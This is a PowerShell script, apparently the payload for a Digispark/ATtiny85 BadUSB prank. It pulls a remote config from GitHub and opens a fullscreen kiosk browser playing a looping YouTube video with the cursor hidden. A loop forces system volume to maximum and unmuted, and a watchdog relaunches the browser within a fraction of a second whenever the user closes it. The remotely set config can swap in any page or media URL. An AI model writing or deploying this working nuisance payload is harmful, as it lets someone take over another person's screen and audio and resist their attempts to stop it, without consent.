<#
  run.ps1 - video de gatitos a pantalla completa + reopen rápido
  Corregido Error 153
#>

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = 3072 } catch {}

$BASE   = 'https://raw.githubusercontent.com/IFROS-GAm/ATTINY85/main'
$cfgUrl = "$BASE/config.txt"

# ---------------- config ----------------
$cfg = @{ mode='youtube'; video_id='ik-nB-VKuEM'; media=''; slide='7';
          volumen='100'; watchdog='1'; titulo='RickDigispark' }
try {
  $txt = (New-Object Net.WebClient).DownloadString($cfgUrl)
  foreach ($ln in ($txt -split "`r?`n")) {
    $l = $ln.Trim()
    if ($l -eq '' -or $l.StartsWith('#')) { continue }
    $i = $l.IndexOf('='); if ($i -lt 1) { continue }
    $k = $l.Substring(0,$i).Trim().ToLower()
    $v = $l.Substring($i+1).Trim()
    if ($cfg.ContainsKey($k)) { $cfg[$k] = $v }
  }
} catch {}

# Forzar el video de gatitos (por si el config falla)
$cfg.video_id = 'ik-nB-VKuEM'
$cfg.mode     = 'youtube'

$titulo = if ($cfg.titulo) { $cfg.titulo } else { 'RickDigispark' }
$perfil = Join-Path $env:TEMP 'venice_kiosk'

# ---------------- volumen ----------------
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDevEnum { }
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator { int _1(); int GetDefaultAudioEndpoint(int flow, int role, out IMMDevice dev); }
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice { int Activate(ref Guid iid, int ctx, IntPtr p, [MarshalAs(UnmanagedType.IUnknown)] out object o); }
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume {
  int _1(); int _2(); int _3();
  int SetMasterVolumeLevel(float f, IntPtr c);
  int SetMasterVolumeLevelScalar(float f, IntPtr c);
  int GetMasterVolumeLevel(out float f);
  int GetMasterVolumeLevelScalar(out float f);
  int _8(); int _9(); int _10(); int _11();
  int SetMute(int m, IntPtr c);
  int GetMute(out int m);
}
public static class Vol {
  static IAudioEndpointVolume V() {
    var e = (IMMDeviceEnumerator)(new MMDevEnum());
    IMMDevice d; e.GetDefaultAudioEndpoint(0, 1, out d);
    Guid iid = typeof(IAudioEndpointVolume).GUID;
    object o; d.Activate(ref iid, 1, IntPtr.Zero, out o);
    return (IAudioEndpointVolume)o;
  }
  public static void Set(float v) { var a = V(); a.SetMasterVolumeLevelScalar(v, IntPtr.Zero); a.SetMute(0, IntPtr.Zero); }
}
'@
$volTarget = [double]$cfg.volumen / 100.0

# ---------------- pagina ----------------
function New-Page {
  $items = @($cfg.media -split ',' | ForEach-Object { $_.Trim() } | Where-Object { $_ })
  $esVideo = ($items.Count -eq 1) -and ($items[0] -match '\.(mp4|webm|ogv|mov|m4v)(\?|$)')

  if ($cfg.mode -eq 'youtube') {
    $id = $cfg.video_id.Trim()
    # === CORRECCIÓN Error 153 (dominio normal + menos parámetros restrictivos) ===
    $u  = "https://www.youtube.com/embed/$id?autoplay=1&loop=1&playlist=$id&controls=0&modestbranding=1&rel=0&fs=0"
    $cuerpo = "<iframe id='m' src='$u' allow='autoplay; fullscreen' allowfullscreen></iframe>"
  } elseif ($cfg.mode -eq 'page') {
    $cuerpo = "<iframe id='m' src='$($items[0])' allow='autoplay; fullscreen' allowfullscreen></iframe>"
  } elseif ($esVideo) {
    $cuerpo = "<video id='m' src='$($items[0])' autoplay loop playsinline></video>"
  } else {
    $cuerpo = "<img id='m' src='$($items[0])'>"
  }
  $lista = ($items | ForEach-Object { "'$_'" }) -join ','

  $html = @"
<!doctype html><html><head><meta charset="utf-8"><title>$titulo</title>
<style>
  html,body{margin:0;padding:0;width:100%;height:100%;background:#000;overflow:hidden}
  *{cursor:none !important}
  #m{position:fixed;left:0;top:0;width:100vw;height:100vh;object-fit:contain;border:0;background:#000}
  iframe#m{pointer-events:none}
</style></head><body>
$cuerpo
<script>
  var SLIDE = $($cfg.slide) * 1000, items = [$lista], m = document.getElementById('m');
  if (m && m.tagName === 'VIDEO') { m.volume = 1; m.play().catch(function(){}); }
  if (m && m.tagName === 'IMG' && items.length > 1) {
    var i = 0;
    setInterval(function(){ i = (i+1) % items.length; m.src = items[i]; }, SLIDE);
  }
  var tEsc = 0, tDel = 0, hecho = false;
  function matar(){
    if (hecho) return;
    hecho = true;
    document.title = 'STOP';
  }
  window.addEventListener('keydown', function(e){
    var t = Date.now(), k = e.key;
    if (k === 'Escape' || k === 'Esc') { tEsc = t; if (t - tDel < 700) matar(); }
    if (k === 'Delete' || k === 'Del') { tDel = t; if (t - tEsc < 700) matar(); }
    if (k === 'Escape' || k === 'Delete') e.preventDefault();
  });
  window.focus();
</script></body></html>
"@
  $ruta = Join-Path $env:TEMP 'venice_kiosk.html'
  [IO.File]::WriteAllText($ruta, $html, [Text.Encoding]::UTF8)
  return $ruta
}

# ---------------- navegador ----------------
function Get-Nav {
  $c = @(
    "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe",
    "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe",
    "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
    "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
    "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
  )
  foreach ($p in $c) { if (Test-Path $p) { return $p } }
  return $null
}
$nav = Get-Nav
if (-not $nav) { exit }
$proc = [IO.Path]::GetFileNameWithoutExtension($nav)

$pagina = New-Page
$url = 'file:///' + ($pagina -replace '\\','/')
if ($cfg.mode -eq 'direct') { $url = $cfg.media }

$flags = "--kiosk `"$url`" --user-data-dir=`"$perfil`" --no-first-run " +
         "--no-default-browser-check --disable-session-crashed-bubble --noerrdialogs " +
         "--autoplay-policy=no-user-gesture-required --disable-infobars " +
         "--disable-features=Translate,msEdgeWelcomePage,EdgeCollections,msEdgeSidebarV2"
if ($nav -match 'msedge') { $flags += ' --edge-kiosk-type=fullscreen' }

$script:pidNav = 0
function Lanzar {
  $p = Start-Process -FilePath $nav -ArgumentList $flags -PassThru
  if ($p) { $script:pidNav = $p.Id }
}

Lanzar
Start-Sleep -Seconds 3

# ---------------- bucle rápido ----------------
while ($true) {
  [Vol]::Set($volTarget)

  $ventanas = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle }

  if ($ventanas | Where-Object { $_.MainWindowTitle -like '*STOP*' }) {
    if ($script:pidNav -and (Get-Process -Id $script:pidNav -ErrorAction SilentlyContinue)) {
      taskkill /PID $script:pidNav /T /F | Out-Null
    } else {
      Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force
    }
    break
  }

  # Reopen casi al instante
  if ($cfg.watchdog -eq '1') {
    if (-not ($ventanas | Where-Object { $_.MainWindowTitle -like "*$titulo*" })) {
      Lanzar
      Start-Sleep -Milliseconds 600
    }
  }

  Start-Sleep -Milliseconds 250
}